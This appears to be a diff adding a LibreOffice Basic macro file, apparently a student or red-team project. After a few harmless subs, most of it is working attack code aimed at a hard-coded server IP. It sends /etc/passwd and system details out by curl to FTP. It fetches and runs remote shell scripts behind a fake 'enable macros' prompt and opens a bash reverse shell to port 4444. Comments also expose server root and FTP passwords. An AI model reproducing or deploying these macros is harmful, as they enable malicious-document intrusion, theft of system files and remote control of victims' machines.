@@ -1,0 +1,264 @@
+REM  *****  BASIC  *****
+
+Sub Main
+
+End Sub
+
+Sub PrintingToScreen
+	MsgBox "Hello, World!"	
+End Sub
+
+Sub OpenWebsite
+    Dim url As String
+    url = "https://www.njit.edu"
+    Shell "xdg-open " & url, 1 
+End Sub
+
+Sub ReadFromFile
+    Dim filePath As String
+    Dim fileNumber As Integer
+    Dim fileContent As String
+    
+    filePath = "/home/andrew/Documents/test.txt"    
+
+    fileNumber = FreeFile
+    Open filePath For Input As fileNumber
+    
+    Do Until EOF(fileNumber)
+        Line Input #fileNumber, fileContent
+        MsgBox fileContent
+    Loop
+    
+    Close fileNumber
+End Sub
+
+Sub ReadAndSaveFile
+    Dim sourceFilePath As String
+    Dim destinationFilePath As String
+    Dim sourceFileNumber As Integer
+    Dim destinationFileNumber As Integer
+    Dim fileContent As String
+    
+    sourceFilePath = "/home/andrew/Documents/test.txt"
+    
+    destinationFilePath = "/home/andrew/Documents/copy.txt"    
+
+    sourceFileNumber = FreeFile
+    Open sourceFilePath For Input As sourceFileNumber
+    
+    destinationFileNumber = FreeFile
+    Open destinationFilePath For Output As destinationFileNumber
+    
+    Do Until EOF(sourceFileNumber)
+        Line Input #sourceFileNumber, fileContent
+        Print #destinationFileNumber, fileContent
+    Loop
+    
+    Close sourceFileNumber
+    Close destinationFileNumber
+    
+    MsgBox "Copy Complete"
+End Sub
+
+'-----------------------------------WIP--------------------------------------
+Sub SendEmail
+    Dim filePath As String
+    Dim recipient As String
+    Dim subject As String
+    Dim body As String
+    Dim command As String
+
+    filePath = "/home/andrew/Documents/test.txt"  ' Change this
+    recipient = "ootbyc@gmail.com"  ' Change this
+    subject = "File Transfer via LibreOffice Macro"
+    body = "Here is the requested file."
+
+    ' Construct the shell command to send the email with the attachment
+    command = "echo " & Chr(34) & body & Chr(34) & " | mutt -s " & Chr(34) & subject & Chr(34) & " -a " & filePath & " -- " & recipient
+    
+    ' Execute the shell command
+    Shell(command, 0)
+
+    MsgBox "Email Sent!"
+End Sub
+
+'Need to set up ssh keys before hand
+''INTRODUCES A KEY TRANSFER AND CREATION PROBLEM
+Sub TransferFileUsingSCP
+    Dim filePath As String
+    Dim remoteHost As String
+    Dim remoteUser As String
+    Dim remotePath As String
+    Dim scpCommand As String
+    Dim shellCommand As String
+
+
+    remoteHost = "165.227.221.46"
+    remoteUser = "root"
+    remotePath = "~/webSever.sh"
+
+    scpCommand = "/usr/bin/scp " & filePath & " " & remoteUser & "@" & remoteHost & ":" & remotePath & " 2> /tmp/scp_error.log"
+
+    shellCommand = "bash -c " & Chr(34) & scpCommand & Chr(34)
+
+    Shell(shellCommand, 0)
+
+    'MsgBox "File transfer started! Check /tmp/scp_error.log for errors."
+End Sub
+
+
+'-------------------------------FINSHED BELOW-------------------------------------------
+'Droplet Admin
+'Username: root
+'Password: MacroC2Pass
+
+
+'Take Files from Script User
+'Username: 	ftpuser
+'Password:	password
+
+'use a temp file should we delete it?
+
+Sub UploadViaFtpLs()
+    Dim filePath As String
+    Dim ftpServer As String
+    Dim username As String
+    Dim password As String
+    Dim remotePath As String
+
+    filePath = "/tmp/toServer.txt" 'Probably Optional
+    ftpServer = "ftp://165.227.221.46"
+    username = "ftpuser"
+    password = "password"
+    'Remote location relative to the ftp home directory
+    remotePath = "/sentftp1.txt" '
+
+	'Copies and sends ls -l in home directory. Swap with bash script for more complexity
+    Shell "/bin/bash -c 'ls -l ~ > """ & filePath & """'", 0 
+
+    Shell "/bin/bash -c 'curl -T " & filePath & " --user " & username & ":" & password & " " & ftpServer & remotePath & "'", 0
+End Sub
+
+Sub UploadViaFtpUname()
+    Dim filePath As String
+    Dim ftpServer As String
+    Dim username As String
+    Dim password As String
+    Dim remotePath As String
+
+    filePath = "/tmp/toServer.txt" 'Probably Optional
+    ftpServer = "ftp://165.227.221.46"
+    username = "ftpuser"
+    password = "password"
+    'Remote location relative to the ftp home directory
+    remotePath = "/sentftp2.txt" '
+
+	'Copies and sends ls -l in home directory. Swap with bash script for more complexity
+    Shell "/bin/bash -c 'uname -a > """ & filePath & """'", 0 
+
+    Shell "/bin/bash -c 'curl -T " & filePath & " --user " & username & ":" & password & " " & ftpServer & remotePath & "'", 0
+End Sub
+
+Sub UploadViaFtpPass()
+    Dim filePath As String
+    Dim ftpServer As String
+    Dim username As String
+    Dim password As String
+    Dim remotePath As String
+
+    filePath = "/tmp/toServer.txt" 'Probably Optional
+    ftpServer = "ftp://165.227.221.46"
+    username = "ftpuser"
+    password = "password"
+    'Remote location relative to the ftp home directory
+    remotePath = "/sentftp3.txt" '
+
+	'Copies and sends ls -l in home directory. Swap with bash script for more complexity
+    Shell "/bin/bash -c 'cat /etc/passwd > """ & filePath & """'", 0 
+
+    Shell "/bin/bash -c 'curl -T " & filePath & " --user " & username & ":" & password & " " & ftpServer & remotePath & "'", 0
+End Sub
+
+
+'Pull Files from FTP Server
+Sub DownloadViaFtpText()
+    Dim filePath As String
+    Dim ftpServer As String
+    Dim username As String
+    Dim password As String
+    Dim remotePath As String
+
+    ' Define paths
+    filePath = "/home/andrew/Documents/fromServerViaFTP.txt" ' Local file to store downloaded content
+    ftpServer = "ftp://165.227.221.46"
+    username = "ftpuser"
+    password = "password"
+    remotePath = "/fromServerViaFTP.txt" ' Remote file to download
+
+    ' Download file from FTP server
+    Shell "/bin/bash -c 'curl --user " & username & ":" & password & " " & ftpServer & remotePath & " -o " & filePath & "'", 0
+End Sub
+
+Sub DownloadViaFtpBash()
+    Dim filePath As String
+    Dim ftpServer As String
+    Dim username As String
+    Dim password As String
+    Dim remotePath As String
+
+    filePath = "/tmp/fromServerViaFTP.sh" ' Local file to store downloaded content
+    ftpServer = "ftp://165.227.221.46"
+    username = "ftpuser"
+    password = "password"
+    remotePath = "/fromServerViaFTP.sh" ' Remote file to download
+
+    Shell "/bin/bash -c 'touch " & filePath & "'", 0
+    Shell "/bin/bash -c 'curl --user " & username & ":" & password & " " & ftpServer & remotePath & " -o " & filePath & "'", 0
+    Shell "/bin/bash -c 'chmod +x " & filePath & "'", 0
+    Shell "/bin/bash -c '" & filePath & "'", 0
+
+End Sub
+
+
+'----------------------------------------------------------------------------------------------------------------------------------------------
+
+'Dowload a Remote File & Execute via Webserver
+
+'Setup
+'Run in the directory with the files that will be taken from server
+'python3 -m http.server 8080
+
+
+'When run the file will be downloaded and saved to the 
+'/tmp directory whcih is cleared on reboot
+'AutoOpen() should be a built in function that runs when file is opened
+Sub WebServerTemp() 
+  MsgBox "Macros are required for this document to display correctly. Click OK to enable."
+  Shell "/bin/bash -c 'curl -s http://165.227.221.46:8080/webServer.sh | bash'", 0
+End Sub
+
+
+'Will save the file to a diffrent area then /tmp so it is not wiped
+'Also changes execution permissions of new file, not sure if we need it
+Sub WebServerPerm()
+  Shell "/bin/bash -c 'curl -s http://165.227.221.46:8080/webServerPerm.sh -o ~/Documents/webServerPersistent.sh && chmod +x ~/Documents/webServerPersistent.sh && bash ~/Documents/webServerPersistent.sh'", 0
+End Sub
+
+
+
+'-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+'Remote Connection
+
+'Setup
+'Will open console connecting to script executor
+'Run listner on server
+'nc -lvnp 4444 
+
+Sub ReverseShelltoC2
+	'IP/PORT of the listner where the console will open
+	Shell("/bin/bash -c 'bash -i >& /dev/tcp/165.227.221.46/4444 0>&1'", 0)
+End Sub
+
+
+
